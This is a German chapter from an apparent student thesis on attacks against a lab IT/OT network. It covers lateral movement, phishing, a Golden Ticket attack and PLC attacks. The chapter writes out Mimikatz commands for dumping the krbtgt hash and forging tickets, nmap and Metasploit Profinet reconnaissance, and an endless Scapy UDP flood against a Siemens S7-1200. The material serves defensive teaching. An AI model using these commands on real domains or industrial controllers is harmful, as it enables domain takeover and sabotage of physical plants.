#import "@preview/htl3r-da:2.0.0" as htl3r

#htl3r.author("David Koch")
= Angriffe auf das Netzwerk <angriffe-netzwerk>

#htl3r.author("David Koch")
== Einführung

Um die Sicherheit der in den obigen Abschnitten erstellten Topologie,  herkömmlicher Firmennetzwerke mit #htl3r.short[ot]-Abschnitten oder die Netzwerke von echter kritischer Infrastruktur zu gewährleisten braucht es ein theoretisches Verständnis von den möglichen Angriffsvektoren als auch die dazugehörige Absicherung, um gegen die bekannten Angriffsvektoren vorzugehen und somit Angriffen vorzubeugen.

=== Sicherheitsmängel bei Bus-Systemen
Im Vergleich zu anderen digitalen Netzwerksystemen der heutigen Zeit sind Bussysteme vom Grundprinzip aus außerordentlich unsicher und leicht manipulierbar. Alle Geräte eines Bussystems hängen an einer Broadcast-Domain. Das bedeutet, dass alle Geräte jeweils alle Informationen, die über den Bus geschickt werden, mitlesen können. Noch dazu werden die über den Bus versendeten Daten unter anderem nicht auf einen legitimen Absender oder Datensatz kontrolliert. Zwar bieten manche #htl3r.short[tcp]/#htl3r.short[ip]-enkapsulierten Bussysteme eine verschlüsselte Ende-zu-Ende-Kommunikation, jedoch sind diese in der Industrie nur selten umgesetzt. Konzepte wie die CIA-Triade und das AAA-System sind der Bus-Welt fremd.

#htl3r.fspace(
  total-width: 95%,
  [
    #figure(
      image("../assets/Bus_Insecurity.png"),
      caption: [Übersicht eines Coil-Werte-Fuzzingss auf einem Modbus-RTU-Bus]
    )
    <coil-fuzzing>
  ]
)

Im Falle eines Angriffs auf ein Bussystem und somit auf das gesamte #htl3r.short[ot]-Netzwerk liegen dem Angreifer viele Möglichkeiten vor, große Schäden anzurichten. Ob nun lediglich alle Informationen mitgehört werden, Werte gefälscht beziehungsweise gefuzzed werden wie in @coil-fuzzing oder doch eine #htl3r.short[dos]-Attacke auf eine #htl3r.short[sps] innerhalb des Bussystems stattfindet, um den gesamten Betrieb lahmzulegen, ist offen. Eines ist jedoch klar: Durch eine ausreichende Absicherung des Übergangs zwischen #htl3r.short[it] und #htl3r.short[ot], das heißt der Firewall auf Ebene 2.5 des Purdue-Modells (siehe @purdue), sind Angriffe auf das #htl3r.short[ot]-Netzwerk leicht vermeidbar. Beispielsweise sollte bei der Ausbreitung eines Netzwerkwurms innerhalb des #htl3r.short[it]-Netzwerks dieser keinesfalls auch in das #htl3r.short[ot]-Netzwerk gelangen können.

=== Stuxnet <stuxnet>
Der 2010 entdeckte Stuxnet-Computerwurm ist ein Schadprogramm, dass speziell entwickelt wurde zum Angriff auf ein #htl3r.short[scada]-System, das #htl3r.shortpl[sps] des Herstellers Siemens vom Typ Simatic S7 verwendet @stuxnet-1[comp]. Da bis Ende September 2010 der Iran den größten Anteil der infizierten Computer besaß und es zu außergewöhnlichen Störungen im iranischen Atomprogramm kam, lag es nah, dass Stuxnet hauptsächlich entstand, um als Schadsoftware die Leittechnik (Zentrifugen) der Urananreicherungsanlage in Natanz oder des Kernkraftwerks Buschehr zu stören @ndu-stuxnet.

Stuxnet gilt aufgrund seiner Komplexität und des Ziels, Steuerungssysteme von Industrieanlagen zu sabotieren, als bisher einzigartig @spiegel-10-jahre-stuxnet[comp]. Das heißt aber nicht, dass in der Zukunft nicht noch weitere Netzwerkwürmer auf das Internet losgelassen werden, deren Hauptziel es sein wird, #htl3r.short[ot]-Netzwerke lahmzulegen.

=== Lateral Movement

Der Begriff "Lateral Movement" beschreibt das Vorgehen von Angreifern sich innerhalb des attackierten Netzwerks vom einem System zum nächsten auszubreiten, Schwachstellen auszukundschaften, Rechteausweitung (engl. privilege escalation) durchzuführen und ihr endgültiges Angriffsziel zu erreichen. @lateral-movement-def[comp]

Bei der Durchführung von Lateral Movement gibt es einige bekannte Techniken, sogenannte Lateral Movement Techniques bzw. #htl3r.longpl[lmp] (#htl3r.shortpl[lmp]):

#htl3r.fspace(
  total-width: 100%,
  figure(
    table(
      columns: (11em, auto, 6em, 6em),
      inset: 10pt,
      align: (horizon + left, horizon + left, horizon + center, horizon + center),
      table.header(
        [*Bezeichnung*], [*Beschreibung*], [*Wahrscheinlichkeit*], [*Erkennbarkeit*],
      ),
      "Internal Spear Phishing", "Angreifer nutzt das kompromitierte E-Mail-Konto eines Mitarbeiters aus, um mit dessen Identität andere Mitarbeiter zu phishen.", "Hoch", "Mittel",
      [#htl3r.long[lotl] (#htl3r.short[lotl])], "Angreifer nutzt die ihm bereits verfügbaren Admin-Tools um unaufällig in den Betriebsprozess einzugreifen und weitere Informationen zu erhalten.", "Hoch", "Mittel/Schwer",
      "Default/Hardcoded Credentials", "Angreifer kann durch die öffentlich bekannten Standard-Zugangsdaten von im Netzwerk eingesetzer Software/Hardware diese übernehmen.", "Niedrig", "Einfach",
      "Remote Services", [Die für routinemäßige Systemadministration erlaubten Kommunikationsschnittstellen wie #htl3r.short[rdp] oder #htl3r.short[ssh] werden vom Angreifer ausgenutzt, um sich weiter im Netzwerk auszubreiten.], "Mittel", "Mittel",
      "Valid Accounts", "Die durch z.B. Phishing erhaltenen Anmeldeinformationen erlauben dem Angreifer, sich als legitimer Benutzer auszugeben.", "Hoch", "Schwer"
    ),
    caption: [Bekannte Lateral Movement Paths @lmp-list-1[comp], @lmp-list-2[comp]],
  )
)

#pagebreak(weak: true)
Die obigen Techniken sind natürlich miteinander kombinierbar, z.B. #htl3r.short[lotl] und Remote Services. Es ist ebenfalls zu beachten, dass die Bewertung der Wahrscheinlichkeit und Erkennbarkeit in der obigen Tabelle von einer bestehenden Absicherung des Netzwerks und vorhandenen #htl3r.short[ids]-Geräten ausgeht.

#htl3r.fspace(
  total-width: 95%,
  figure(
    image("../assets/LMPs_Ungesichert.png"),
    caption: [Die möglichen LMPs innerhalb eines ungesicherten Netzwerks]
  )
)

Bevor der Angreifer jedoch mögliche #htl3r.shortpl[lmp] ausnutzen kann, muss dieser überhaupt in das Netzwerk eindringen. Dies geschieht meist durch Identity-Angriffe wie Phishing-Mails, aber auch durch maliziöse Downloads und bereits kompromitierte Hardware.

Zur Entdeckung von möglicher Lateral-Movement-Aktivität im Netzwerk können folgende Strategien eingesetzt werden:

- Mögliche #htl3r.shortpl[lmp] innerhalb des eigenen Netzwerks vorab auskundschaften, quasi in Form einer Risikoanalyse. Mit der fertigen Risikoanalyse kann proaktiv gegen #htl3r.shortpl[lmp] vorgegangen werden, aber auch für den Angriffsfall ein #htl3r.long[icp] zur Reaktion auf die ausgenutzten Schwachstellen erstellt werden, falls die Vorbeugung dieser zu umständlich seien sollte.
- Netzwerküberwachungs-Tools bzw. #htl3r.shortpl[ids], die den Systemadministrator*innen Analysedaten über den Datenverkehr im Netzwerk liefern und somit auf die Ausnutzung eines #htl3r.short[lmp] hinweisen.
- In Kombination mit der Nutzung von Überwachungs-Tools detailierte Dokumentationen führen, welche Geräte und Benutzer sich im Netzwerk aufhalten sollten und welche Rollen sie haben, um bei der Erkennung von unbekannten Geräten im Netzwerk als auch bei unberechtigten Zugriffen zu helfen.
@lateral-movement-def[comp]

Zur Verhinderung von Lateral Movement können unter anderem Netzwerksegmentierung, Patchmanagement zur Behebung von bekannten Sicherheitslücken als auch Zugriffskontrolle auf bestimmte Daten, Geräte oder Netzwerkabschnitte implementiert werden.
@lateral-movement-def[comp]

Die Umsetzung dieser Entdeckungs- als auch Verhinderungsstrategien in der "Fenrir"-Topologie wird in @netzwerkueberwachung, @firewall-config und @weitere-absicherung genauer beschrieben.

#htl3r.author("Gabriel Vogler")
== Angriffe auf das IT-Netzwerk

=== Phishing-Mail auf dem Exchange-Server
Nur selten passieren Angriffe, die als Endergebnis beispielsweise die Störung des Exchange-Mail-Servers haben. Meistens wird die Präsenz eines Mail-Servers lediglich genutzt, um als "Sprungbrett" ins interne Netzwerk zu dienen durch Phishing-Angriffe.
Phishing gehört zu den häufigsten und einfachsten Angriffsmethoden in der Cyberkriminalität. Trotz seiner Einfachheit ist es eine der effektivsten Methoden, um an vertrauliche Informationen wie Zugangsdaten oder andere sensible Daten zu gelangen. Bei einem Phishing-Angriff versucht der Angreifer, durch gefälschte E-Mails, welche von einer augenscheinlich vertrauenswürdigen Quelle stammen, den Empfänger zu täuschen und dazu zu bringen Informationen preiszugeben. Oft geschieht dies über einen Link zu einer "Phishing-Seite", die eine seriöse Website imitiert. Auf dieser Seite wird das Opfer aufgefordert seine Zugansdaten einzugeben, welche dann in Besitz des Angreifers gelangen.
Alternativ kann ein solcher Angriff auch ohne Link erfolgen - beispielsweise durch eine Aufforderung, bestimmte Daten per Anwort auf die E-Mail zu übermitteln. \
@phishing-mail-doc[comp]

Ein typisches Beispiel für einen solchen Angriff wird in @angriffsszenario beschrieben.

#htl3r.author("David Koch")
=== Ransomware auf Endgeräten

Wenn bei einem Cyberangriff auf #htl3r.short[ot]-Infrastruktur der Profit und sonst kein strategisches Ziel im Vordergrund steht, ist ein Ransomware-Angriff am wahrscheinlichsten @tsystems-ot-ransomware[comp].

Am 12. Mai 2017 hat der WannaCry-Ransomware-Wurm mehr als 200.000 Computer in über 150 Ländern infiziert. Durch dieses Ereignis ist WannaCry die bekannteste Ausführung eines Ransomware-Angriffs geworden. @cloudflare-wannacry[comp]

#htl3r.fspace(
  figure(
    image("../assets/wannacry.png"),
    caption: [Das berüchtigte Wannacry-Decryptor-Popup @wannacry-image]
  ),
)

Heutzutage sind die meisten Endgeräte -- soweit sie regelmäßig Updates erhalten -- gegen Wannacry geschützt @msrc-wannacrypt[comp]. Trotzdem ist es wichtig, gehen ähnliche Ransomware-Angriff gewappnet zu sein, sei dies durch die Vorbeugung durch moderne Firewalls, die die Signaturen dieser Payloads erkennen und blockieren, oder Endpoint-Security auf den Endgeräten.

#htl3r.author("Gabriel Vogler")
=== Golden-Ticket Angriff
Ein Golden Ticket ist ein gefälschtes Kerberos-#htl3r.short[tgt], wodurch ein Angreifer nahezu vollständigen und langfristigen Zugriff (Standardmäßig zehn Jahre) auf eine #htl3r.short[ad]-Domain erhält. Diese Art von Angriff ist besonders gefährlich, da er dem Angreifer ermöglicht, sich als Domain-Administrator auszugeben ohne sich während der Gültigkeit des Tickets erneut anmelden zu müssen. Das Golden Ticket wird mit dem #htl3r.short[ntlm]-Hash des Benutzers "krbtgt" erstellt. Dieser ist der Benutzer, der die Tickets für das #htl3r.short[ad] signiert. \
@golden-ticket-doc[comp]

Wenn ein Domain-Administrator vergisst, sich aus einem System auszuloggen, kann ein Angreifer ein Golden Ticket erstellen und dieses exportieren. Wenn der Angreifer ein Ticket hat, kann er sich als Administrator des #htl3r.long[ad] ausgeben und hat somit Zugriff auf alle Ressourcen des #htl3r.short[ad]. Ausgeführt kann diese Attacke mit dem Tool "Mimikatz" werden.

Auf dem System, auf dem der Domain-Administrator angemeldet ist, wird der Angriff gestartet.
Im ersten Schritt wird Mimikatz ausgeführt und der #htl3r.short[ntlm]-Hash von "krbtgt" ausgelesen. "krbtgt" ist der Benutzer, der die #htl3r.longpl[tgt] für das #htl3r.short[ad] signiert.
Das wurde mit folgendem Befehl realisiert:
#htl3r.code(caption: "Auslesen des NTLM-Hashes von krbtgt", description: none)[
```
lsadump::dcsync /domain:corp.fenrir-ot.at /user:krbtgt
```
]

#htl3r.fspace(
  figure(
    image("../assets/mimikatz_ptt/01_krbtgt_Hash_auslesen.png"),
    caption: [Auslesen des NTLM-Hashes von krbtgt mit Mimikatz]
  )
)

Sobald der #htl3r.short[ntlm]-Hash von "krbtgt" ausgelesen ist, wird das System des Administrators nicht mehr benötigt und es kann auf einem beliebigen Client weitergemacht werden. Angemeldeter Benutzer ist `dkoch`. Der #htl3r.short[sid] der Domain muss ausgelesen werden, damit das Ticket der Domain zugeordnet werden kann. Dazu wird ein Teil der #htl3r.short[sid] des Benutzers genommen und der letzte Teil abgeschnitten.
#htl3r.code(caption: "Auslesen vom SID der Domain", description: none)[
```
whoami /user
```
]

#htl3r.fspace(
  figure(
    image("../assets/mimikatz_ptt/02_SID_auslesen.png"),
    caption: [Auslesen vom SID der Domain]
  )
)

Mit dem #htl3r.short[sid] wird ein Golden Ticket erstellt. Dazu wird der NTLM-Hash von krbtgt, der #htl3r.short[fqdn] der Domain und der Benutzername des Benutzers benötigt. Zusätzlich muss noch die ID des Administrators angegeben werden. Die ID ist standardmäßig 500.
#htl3r.code(caption: "Erstellen des Golden Tickets", description: none)[
```
kerberos::golden /user:<USER> /domain:<FQDN> /sid:<SID> /krbtgt:<NTLM-HASH> /id:500
```
]

#htl3r.fspace(
  figure(
    image("../assets/mimikatz_ptt/03_golden_ticket_erstellen.png"),
    caption: [Erstellen des Golden Tickets]
  )
)

Die Datei, die das Ticket enthält ist `ticket.kirbi`. Das Ticket kann jederzeit verwendet werden, um sich als Administrator auszugeben. Das Ticket wird mit Mimikatz geladen, und eine Shell mit den Rechten des Administrators gestartet.
#htl3r.code(caption: "Laden des Golden Tickets und Starten einer Shell", description: none)[
```
kerberos::ptt ticket.kirbi
misc::cmd
```
]

Um die Berechtigungen zu testen, kann mit der Shell auf das C Laufwerk eines anderen Systems zugegriffen werden.
#htl3r.code(caption: "Zugriff auf das C Laufwerk eines DCs", description: none)[
```cmd
pushd \\dc01.corp.fenrir-ot.at\c$
```
]

#htl3r.fspace(
  figure(
    image("../assets/mimikatz_ptt/04_shell.png"),
    caption: [Zugriff auf das C Laufwerk eines DCs]
  )
)

Der Angreifer hat mit dem Golden Ticket vollen Zugriff auf das C Laufwerk des #htl3r.long[dc]s und somit auf das Zentrum des #htl3r.short[ad]. Um Angriffe wie diesen zu vermeiden wird in @ad_hardening das #htl3r.long[ad] gehärtet.

#htl3r.author("David Koch")
== Angriffe auf das OT-Netzwerk

=== Physische Manipulation

Bevor man die digitale Absicherung des #htl3r.short[ot]-Netzwerks in Betracht zieht, sollte die physische Sicherheit der #htl3r.short[ot]-Umgebung bereits gewährleistet sein. Wenn eine unauthorisierte Person beispielsweise in eine Fabrik einbrechen und dort die Steuerungstechnik manipulieren sollte -- egal ob das durch die Trennung eines Kabels oder der gezielten Umprogrammierung einer #htl3r.short[sps] durch ihre serielle Schnittstelle passiert -- ist vom Schlimmsten auszugehen.

#htl3r.fspace(
  figure(
    image("../assets/physische_manipulation.jpg"),
    caption: [Durchtrennung eines Datenkabels der LOGO! SPS]
  )
)

Die Menschheit ist sich schon seit langer Zeit über die Wichtigkeit der physischen Sicherheit bewusst, somit werden in den meisten industriellen Anlagen bereits Überwachungssysteme wie #htl3r.short[cctv] als auch Perimeterschutz durch Stacheldrahtzäune und Alarmanlagen eingesetzt.

Die Diplomarbeit fokussiert sich jedoch auf die Absicherung der Schnittstellen zwischen #htl3r.short[it]- und #htl3r.short[ot]-Netzwerken, das heißt, dass keine physische Absicherung stattfindet.

#htl3r.author("David Koch")
=== Netzwerkaufklärung <recon>

Bevor ein Angriff stattfinden kann, muss der Angreifer wissen, was es überhaupt im Netzwerk gibt und was für Schwachstellen ausgenutzt werden können. Dieser wichtige Schritt nennt sich Netzwerkaufklärung und kann mit vielen verschiedenen Tools durchgeführt werden. Im Rahmen der in diesem Projekt durchgeführten #htl3r.short[ot]-Angriffe werden Nmap und Metasploit verwendet, wobei Metasploit nicht nur der Netzwerkaufklärung sondern bereits auch dem Penetration-Testing dient.

#htl3r.fspace(
  total-width: 95%,
  figure(
    image("../assets/s7_1200_nmap.png"),
    caption: [Port-Scan der S7-1200 SPS]
  )
)

Bereits durch einen Port-Scan der #htl3r.short[sps] kann der Angreifer Informationen über mögliche Schwachstellen ergattern. Es sind derzeit folgende Ports offen, die eine Gefahr darstellen können:
- *#htl3r.short[tcp]-Port 102:* Hostet den ISO-TSAP-Dienst, welcher dazu dient, um über die Siemens-#htl3r.short[sps]-Administrationssoftware STEP 7 per Fernwartung mit der #htl3r.short[sps] kommunizieren zu können und Einstellungen vorzunehmen. Dieser Port kann *nicht* deaktiviert werden.
- *#htl3r.short[udp]-Port 161:* Hostet den #htl3r.short[snmp]-Dienst. Dieser dient der Übermittlung von Logdaten an externe Log-Server und der Konfiguration des Gerät per Fernwartung. Ist standardmäßig aktiviert, kann und sollte aber für erhöhte Sicherheit deaktiviert werden.

Nachdem der Port-Scan fertig ist, weiß der Angreifer nun, welche Schnittstellen er über das Netzwerk nutzen kann, um die #htl3r.short[sps] anzugreifen. #htl3r.short[snmp] kann besonders bei Fehlkonfiguration der Zugriffsberechtigung zum Verhängnis werden. Da aber jedoch der ISO-TSAP-Dienst zur Fenrwartung nicht deaktiviert werden kann, ist dieser immer von Interesse für Angreifer. Aber: durch diesen Port-Scan wurden nur die #htl3r.short[udp]- und #htl3r.short[tcp]-Schnittstellen identifiziert. Diese liegen auf der vierten Schicht im #htl3r.short[osi]-Schichtenmodell, wobei meistens #htl3r.shortpl[sps] mittels Netzwerkkommunikation auf der zweiten Schicht konfiguriert werden. 

Eines der L2-Protokolle zur #htl3r.short[sps]-Konfiguration ist Profinet DCP. Das DCP steht für "Discovery and basic Configuration Protocol" und einige Funktionen des Protokolls inkludieren die Identifizierung von Profinet-Geräten im Netzwerk (Identify), die Abfrage von Informationen (Get), das Setzen der #htl3r.short[ip]-Adresse sowie des Hostnamens (Set) und das Zurücksetzen auf Werkseinstellungen (Reset). Die S7-1200 antwortet standardmäßig auf Profinet DCP Anfragen. Somit wird nun versucht, über das Protokoll Profinet DCP die Informationen -- z.B. der Firmware-Version -- der #htl3r.short[sps] abzufragen. @profinet-dcp-doc

Um ein Protokoll wie Profinet DCP gezielt einzusetzen, können die nötigen Frames für den Angriff gezielt erstellt und der #htl3r.short[sps] geschickt werden. Dies kann von Grund auf neu gemacht werden, im Rahmen dieser Diplomarbeit hatten wir jedoch den Vorteil, ein Metasploit-Modul zur DCP-Ausnutzung von der Limes Security GmbH zur Verfügung gestellt zu bekommen. Mit diesem lassen sich die zuvor erwähnten Funktionen wie Get und Set "out of the box" verwenden. Es bietet einige Parameter, mit welchem die DCP-Funktionen wie Discover, Get und Reset genutzt werden können:

#htl3r.fspace(
  total-width: 95%,
  figure(
    image("../assets/dcp/dcp_1.png"),
    caption: [Die Einstellungen des Profinet DCP Metaploit-Moduls]
  )
)

Um nun das Modul für die Netzwerkaufklärung zu nutzen, muss der Python-Binary zuerst erlaubt werden, Packets bzw. Frames zu fälschen und diese auf einem beliebigen Interface auszuschicken. Anschließend kann das Python-Skript hinter dem Metasploit-Modul mit der `--interface` Option aufgerufen werden, um den DCP-Identify-Scan zu starten.

#htl3r.code(caption: "Profinet DCP Identify mittels Metasploit-Modul", description: none)[
```bash
setcap cap_net_raw=+ep /usr/bin/python3
python3 modules/auxiliary/scanner/scada/dcp.py --interface eth1
```
]

Nach wenigen Sekunden ist der Identify-Scan fertig und liefert dem Angreifer die nächsten Informationen: Im Netzwerk ist eine S7-1200 mit der MAC-Adresse `8c:f3:19:0b:ec:c3` vorhanden, auf welcher die Firmware-Version v4.3.1 installiert ist. Der Angreifer hat nun genug Informationen, um einen #htl3r.short[dos]-Angriff gegen die S7-1200 zu starten, denn der #htl3r.short[cve]-2019-10936 beschreibt eine Schwachstelle in den Firmware-Versionen vor v4.4.0 auf der ISO-TSAP-Schnittstelle der S7-1200 #htl3r.short[sps] @siemens-sps-dos-cve. Die Schwachstelle wird in @dos-sps ausgenutzt. 

#htl3r.author("David Koch")
=== DoS einer SPS <dos-sps>

Die #htl3r.short[cve]-Beschreibung von #htl3r.short[cve]-2019-10936 lautet: "Affected devices improperly handle large amounts of specially crafted #htl3r.short[udp] packets. This could allow an unauthenticated remote attacker to trigger a denial of service condition." @siemens-sps-dos-cve Es wird ebenfalls erwähnt, dass nur Firmware-Versionen unter v4.4.0 von dieser Schwachstelle betroffen sind. Wie bereits in @recon ermittelt worden ist, hat die auf der S7-1200 derzeit installierte Firmware die Version v4.3.1. Das heißt: Der Angriff kann beginnen.

Was mit "specially crafted #htl3r.short[udp] packets" gemeint ist, ist nicht näher beschrieben. In den meisten #htl3r.short[dos]-Angriffen handelt es sich bei diesen Packets meist um Buffer-Underflow- bzw. Buffer-Overflow-Payloads. Bei einem Underflow werden in den einzelnen Packets zu wenige Nutzdaten übermittelt, bei einem Overflow werden zu viele Nutzdaten übermittelt. Insgesamt werden diese Packets dann in sehr großen Mengen an das anzugreifende Gerät geschickt, um den #htl3r.short[dos]-Zustand auszulösen.

#htl3r.code(caption: "Erstellung und Versendung des UDP-Packets für den DoS-Angriff auf die S7-1200", description: none)[
```python
from scapy.layers.inet import IP, UDP
from scapy.sendrecv import send

target_ip = "10.79.84.1"
target_port = 102
payload = b"A" * 1000

udp_packet = IP(dst=target_ip) / UDP(dport=target_port) / payload
while True:
    send(udp_packet, count=2000)
```
]

In Quellcode 7.7 wird die Python-Bibliothek Scapy verwendet, um das für den Buffer-Overflow benötigte #htl3r.short[udp]-Packet zu erstellen und anschließend an die #htl3r.short[sps] zu schicken.

#htl3r.author("David Koch")
=== Manipulation einer SPS

Ein Angreifer sollte unter keinen Umständen die Programmierlogik einer #htl3r.short[sps] manipulieren können. Im Vergleich zu einem #htl3r.short[dos]-Angriff auf eine #htl3r.short[sps] oder andere Geräte im #htl3r.short[ot]-Netzwerk kann durch die gezielte Umprogrammierung einer #htl3r.short[sps] ein viel größerer Schaden in einem Bruchteil der Zeit angerichtet werden.

Beim in @stuxnet beschriebenen Stuxnet-Angriff wurden bestimmte Register der S7-#htl3r.shortpl[sps] manipuliert. Der Angriff hat auf einem sogenannten "Zero-Day-Exploit" beruht, einer Schwachstelle, die dem Hersteller -- in diesem Fall Siemens -- noch nicht bekannt war. Da die Entdeckung eines Zero-Day-Exploits in einer Siemens #htl3r.short[sps] oder der OpenPLC-Codebasis den Rahmen dieser Diplomarbeit sprengen würde, wird ein vereinfachtes aber trotzdem realistisches Angriffsszenario zur Manipulation einer #htl3r.short[sps] durchgeführt. 

Das Metasploit-Modul, welches bereits in @recon verwendet wurde, um die Firmware-Version zu ermitteln, kann auch zur Setzung der #htl3r.short[sps]-#htl3r.short[ip]-Adresse und der Zurücksetzung auf Werkseinstellungen verwendet werden. Da aber die Firmware-Versionen ab v4.0.0 die Kommunikation mit der S7-1200 über Profinet DCP einschränken, funktionieren die meisten Features des Metasploit-Modul -- zumindest im laufenden Betriebs -- nicht mehr. 

#htl3r.fspace(
  total-width: 95%,
  figure(
    image("../assets/dcp/dcp_4.png"),
    caption: [Der gescheiterte Versuch, die S7-1200 im laufenden Betrieb mittels Profinet DCP zurückzusetzen]
  )
)

Nur wenn die #htl3r.short[sps] sowieso schon im Wartungsmodus ist, funktionieren die DCP-Funktionen wie z.B. die Setzung einer neuen #htl3r.short[ip]-Adresse.

#htl3r.fspace(
  total-width: 95%,
  figure(
    image("../assets/dcp/dcp_5.png"),
    caption: [Der erfolgreiche Versuch, die IP-Adresse der S7-1200 im Wartungsmodus mittels Profinet DCP zu ändern]
  )
)

Als alternatives Szenario wird eine von einem Angreifer per #htl3r.short[rdp]-Verbindung übernommenen Engineer-Workstation, welche Zugriff auf die Umprogrammierung von #htl3r.shortpl[sps] im #htl3r.short[ot]-Netzwerk hat. Er erstellt lokal ein maliziöses OpenPLC-Programm, welches in der zweiten Betriebszelle die Filter-Pumpe permanent einschaltet und die Übergangs-Pumpe permanent ausschaltet, um den zweiten Tank überfließen zu lassen. Anschließend lädt er dieses im OpenPLC-Webdashboard hoch und führt es aus, um die gewünschte Wirkung zu erreichen.

#htl3r.fspace(
  figure(
    image("../assets/openplc/malicious_program.png"),
    caption: [Das maliziöse OpenPLC-Programm]
  )
)

=== Unbefugter Zugriff auf das SCADA

Das #htl3r.short[scada]-System der Modell-Kläranlage bietet die Möglichkeit, alle Aktoren bis auf das Magnetventil des Staudamms in Betriebszelle ferngesteuert ein- und auszuschalten. Was für die Wartung der Anlage äußerst nützlich sein kann, ist für mögliche Angreifer ein Traum. Somit ist es wichtig, nur autorisierten Mitarbeitern Zugriff auf das #htl3r.short[scada] zu gewähren, denn wenn dies nicht passiert, kann ein Angreifer ohne jegliche Manipulation der #htl3r.shortpl[sps] die Anlage zum stehen bringen oder auch einen verheerenden Schaden anrichten.

#pagebreak(weak: true)
#htl3r.author("David Koch")
== Konkretes Angriffsszenario <angriffsszenario>

Durch die Kombination der oben angeführten möglichen Angriffe lässt sich ein konkretes Angriffsszenario konzipieren, welches in dieser Form auch in einem Echtbetrieb stattfinden könnte:

1. Eine Phishing Mail wird von außen (aus dem Internet) an das Management geschickt.
2. Mittels gestohlener Identität eines Managementmitarbeiters wird eine interne Spear-Phishing-Mail an einen #htl3r.short[ot]-Engineer geschickt.
3. Angreifer nutzt die #htl3r.short[rdp]-Berechtigungen des #htl3r.short[ot]-Engineers um tiefer in die Anlage einzudringen.
4. #htl3r.long[lotl]: Angreifer sammelt über das #htl3r.short[scada]-System Infos, wie die Anlage intern ausschaut.
5. Angreifer entdeckt die Default Credentials auf der OpenPLC-#htl3r.short[sps].
6. Steuerung der zweiten Betriebszelle wird umprogrammiert.
7. Anlage kommt zum Stehen, nachhaltiger Schaden wurde angerichtet.

=== Phishing-Mail

Der Angriff beginnt -- wie viele andere Angriffe in der Realität auch -- mit einer Phishing-Mail. Zuerst wird eine E-Mail an eine Person geschickt, die regelmäßig mit externen Personen kontakt hat und es somit nicht unbedingt auffällt, wenn mit einer gefälschten Identität eine Phishing-Mail empfangen wird.

#htl3r.fspace(
  [
    #figure(
      image("../assets/phishing_mail.png", width: 75%),
      caption: [Phishing-Mail von einem gefälschtem Siemens Kundensupport]
    )
    <phishing-mail>
  ]
)

In der in @phishing-mail gezeigten E-Mail ist nicht nur eine legitime vom offiziellen Siemens Kundensupport veröffentlichte Umfrage enthalten, sondern auch ein Link zu einem maliziösen PDF, welches sich als Produktkatalog für das zweite Quartal des Verkaufsjahres 2025 tarnt. Man beachte, dass der Link zu der Umfrage unter der authentischen `www.siemens.com` Domain zu finden ist, während das PDF unter `www.siemems.com` liegt.

Der Manager David Koch hat zwar kein Interesse an der Umfrage, der Produktkatalog sticht ihm jedoch sofort ins Auge. Er besucht -- ohne die falsche Domain zu beachten -- die Website und lädt sich den Produktkatalog herunter. Beim Öffnen der PDF-Datei öffnet sich für einen kurzen Augenblick eine Windows-Kommandozeile, der Manager denkt sich jedoch nichts dabei. Tatsache ist: Auf seinem Gerät ist nun ein Trojaner, welcher dem Angreifer ein Backdoor-Access auf sein System und die derzeit aktiven Konten gibt. Diese Art von Phishing-Angriff mittels Trojaner-PDF ist sehr üblich und Microsoft hat bereits mehr als 500 verschiedene Signaturen zu dieser Art von Angriff gesammelt @ms-security-pdf-phish[comp].

=== Spear-Phishing

Nachdem das Gerät und somit auch das E-Mail-Konto des Managers übernommen worden ist, wird dessen gestohlene Identität dazu ausgenutzt, eine weitere Phishing-Mail zu verschicken. Durch die sogenannte "Open Source Intelligence" hat der Angreifer im Vorhinein die im "Fenrir"-Betrieb aktiven #htl3r.short[ot]-Administratoren ausgekundschaftet. Nun schickt er eine Spear-Phishing-Mail -- eine gezielte Phishing-Mail -- an einen #htl3r.short[ot]-Administrator.

#htl3r.fspace(
  total-width: 90%,
  [
    #figure(
      image("../assets/spear_phishing_mail.png"),
      caption: [Spear-Phishing-Mail vom Benutzerkonte des Managers]
    )
    <spear-phishing-mail>
  ]
)

Der #htl3r.short[ot]-Administrator liest diese E-Mail, hinterfragt die Aufforderung des Managers nicht und schickt ihm die Zugangsdaten zu den #htl3r.short[ot]-Workstations. Eine physische Absprache mit dem Manager, ob dieser auch tatsächlich hinter dieser Aufforderung steckt, hätte den Angreifer auffliegen lassen. Da die E-Mail jedoch von der echten Fenrir-Domain und dem dkoch Benutzer aus geschickt worden ist und diese einen dringlichen Ton aufweißt, hat der #htl3r.short[ot]-Administrator nicht gezögert.

#htl3r.fspace(
  [
    #figure(
      image("../assets/spear_phishing_sender.png", width: 80%),
      caption: [Die Details zum Absender der Spear-Phishing-Mail]
    )
    <spear-phishing-mail>
  ]
)

=== RDP Lateral Movement

Der Angreifer nutzt nun die vom #htl3r.short[ot]-Administrator erhaltenen Zugangsdaten (`ot-worker` / `OT_Ist_Toll&Sicher_123!`), um sich per #htl3r.short[rdp] auf eine der #htl3r.short[ot]-Workstations zu verbinden. Er breitet sich im Netzwerk aus, bisher quasi unbemerkt.

#htl3r.fspace(
  figure(
    image("../assets/ot_rdp.png", width: 75%),
    caption: [Aufbau der RDP-Verbindung zur OT-Workstation]
  )
)

=== Living of the Land

Mit dem erfolgreichen Aufbau einer #htl3r.short[rdp]-Verbindung zu einer #htl3r.short[ot]-Workstation kann der Angreifer nun genauere Informationen über das #htl3r.short[ot]-Netzwerk sammeln. Durch einen Range-Ping mit einem Tool wie `nmap` kann ein Teil vom #htl3r.short[ot]-Netzwerk gescannt werden, und anschließend können die gefundenen Geräte auf offene Ports -- ebenfalls mittels `nmap` -- gescannt werden.

#htl3r.code(caption: "Netzwerkaufklärung von der OT-Workstation aus", description: none)[
```bash
nmap -sP 10.34.0.0-254
nmap 10.34.0.50
```
]

Nach dem Ausführen von den Befehlen in Quellcode 7.8 weiß der Angreifer, dass auf der #htl3r.short[ip]-Adresse `10.34.0.50` der #htl3r.short[tcp]-Port 80 offen ist, was auf ein Web-Interface hindeutet.

#htl3r.fspace(
  total-width: 100%,
  figure(
    image("../assets/scada_attack_rdp.png"),
    caption: [Das SCADA-Webinterface über die Angreifer-RDP-Session]
  )
)

Über das #htl3r.short[scada]-Dashboard kann der Angreifer nun die gesamte #htl3r.short[ot]-Gerätschaft auskundschaften und mit dem besseren Überblick diese gezielt angreifen.

=== Default Credentials auf der SPS

Durch die flüchtige Implementierung bzw. eine mangelnde Härtung der OpenPLC-#htl3r.short[sps] wurden die Default-Anmeldedaten für das Webdashboard nicht geändert. Diese sind unabhängig von jeglichen Systembenutzern und müssen im Webdashboard unter "Users" manuell geändert werden.

